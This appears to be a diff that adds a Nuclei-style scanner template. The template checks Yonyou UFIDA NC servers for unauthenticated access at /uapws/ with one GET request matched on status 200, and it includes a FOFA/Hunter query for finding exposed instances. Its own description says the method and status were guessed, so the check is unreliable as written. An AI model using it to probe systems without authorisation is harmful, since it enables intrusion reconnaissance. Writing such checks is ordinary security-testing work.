@@ -1,0 +1,23 @@
+id: poc-5f5b2514c52bc99ca0c2
+info:
+  name: 用友UFIDANCuapws存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5f5b2514c52bc99ca0c21f5a95c66734
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 5f5b2514c52bc99ca0c21f5a95c66734
+    fofa: + hunter`app.name="用友 UFIDA NC"`
+http:
+- raw:
+  - 'GET /uapws/ HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
